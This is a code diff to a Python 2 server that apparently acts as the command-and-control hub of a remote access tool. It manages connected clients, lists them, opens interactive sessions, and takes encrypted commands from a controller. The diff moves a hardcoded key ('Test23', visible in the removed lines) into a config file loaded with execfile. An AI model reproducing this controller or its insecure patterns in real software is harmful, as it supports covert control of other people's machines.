@@ -17,6 +17,9 @@ if (len(sys.argv) == 4):
 	password = sys.argv[3]
 else: sys.exit("Usage: server.py <port> <bridge port> <password>")
 
+config = {}
+execfile("Control.conf", config) 
+
 s=socket(AF_INET, SOCK_STREAM)
 s.settimeout(5) #5 seconds are given for every operation by socket `s`
 s.bind(("0.0.0.0",port))
@@ -29,7 +32,9 @@ bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 allConnections = []
 allAddresses = []
 
+## ############################
 #Close all Connections
+## ############################
 def quitClients():
 	for item in allConnections:
 		try:
@@ -41,15 +46,11 @@ def quitClients():
 	del allConnections[:]
 	del allAddresses[:]	
 	update = 'UPDATE clients SET active="0";'
-	db = Database().query(update)
-    
-#def jsonDecode(string, value):
-#    parsed_json = json.loads(string)
-#    result = (parsed_json[value])
-#    return str(result)
-    
+	db = Database().query(update)    
 
+## ############################
 ## Get Client Connections
+## ############################
 def getConnections():
     while True:
 		try:
@@ -71,15 +72,18 @@ def getConnections():
     return reply
 
 
-
+## ############################
 ## Sending to Controller
+## ############################
 def sendController(msg, q):
 	try:
 		q.send(msg)
 		return 1 #success
 	except: return 0 #fail
-
+	
+## ############################
 ## User Login Verification
+## ############################
 def verifyUser(credentials):
 	Passwd = Decode().cpassword(credentials)
 	if (Passwd == password): 
@@ -88,7 +92,10 @@ def verifyUser(credentials):
 	else: 
 		print " [-] Authentication Failed"
 		return False
-        
+
+## ############################
+##  List Connected Clients
+## ############################
 def listClients():
     clientList = []
     d = {}
@@ -100,7 +107,8 @@ def listClients():
 				clientList.append(d)
 			jsonList = Encode().process(clientList)
 			reply = {"status":"OK", "command":"list", "total": str(length), "clients": clientList, "error": "null"}
-		else: eply = {"status":"OK", "command":"list", "total": "0", "clients": "null", "error": "null"}
+		else: reply = {"status":"OK", "command":"list", "total": str(length), "clients": "null", "error": "null"}
+		reply = Encode().process(reply)
 		return reply
     except Exception as e: print " [!] {error}".format(error = e)
 
@@ -157,7 +165,7 @@ def main():
 		bridge.listen(0)
 		q,addr=bridge.accept()
 		cpass = q.recv(20480)
-		Cpass = encryption().decrypt(cpass, "Test23")
+		Cpass = encryption().decrypt(cpass, config["password"])
 		verifyUser(Cpass)
 
 		timeout = time.time() + 500
@@ -172,41 +180,39 @@ def main():
 
 			try: 
 				message = q.recv(20480)
-				Message = encryption().decrypt(message, "Test23")
-				command = jsonDecode(Message, "command")
+				Message = encryption().decrypt(message, config["password"])
+				command = Decode().serverProcess(Message)
 				print " [+] Recieved Command: {CMD}".format(CMD=command)
 			except: break
             
 			if (command == "accept"):
 				clients = getConnections()
-				clients = encryption().encrypt(clients, "Test23")
+				clients = encryption().encrypt(clients, config["password"])
 				if (sendController(clients, q) == 0): break
+				else: pass
 
 			elif(command == "list"):
 				clientList = listClients()
-				clientList = encryption().encrypt(clientList, "Test23")
+				try:
+					clientList = encryption().encrypt(clientList, config["password"])
+				except Exception as e:
+					print e
 				sendController(clientList, q)
 
 			elif(command == "interact"):
-				client = jsonDecode(message, "client")
+				client = Decode().serverProcessClient(Message)
 				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
 					body = {"status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
 					reply = Encode().process(body)
-					reply = encryption().encrypt(reply, "Test23")
+					reply = encryption().encrypt(reply, config["password"])
 					sendController(reply, q)
 					inter = interact(int(client), timeout, q)
 				else:
 					body = {"status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
 					reply = Encode().process(body)
-					reply = encryption().encrypt(reply, "Test23")
+					reply = encryption().encrypt(reply, config["password"])
 					sendController(reply, q)
 
-			#elif (command == "selfupdateall"):
-			#	for item in allConnections:
-			#		try:
-			#			item.send(command)
-			#		except:
-			#			pass
 			elif(command == "quitClients"): quitClients()
 				
 			elif(command == "quit"):
@@ -218,7 +224,7 @@ def main():
 					"reply": "I'm Affraid I Can't Let You Do That Dave",
 					 "error": "ID Out Of Range"}
 				reply = Encode().process(body)
-				reply = encryption().encrypt(reply, "Test23")
+				reply = encryption().encrypt(reply, config["password"])
 				if (sendController(reply, q) == 0): break
 				else:pass
 print config["intro"]
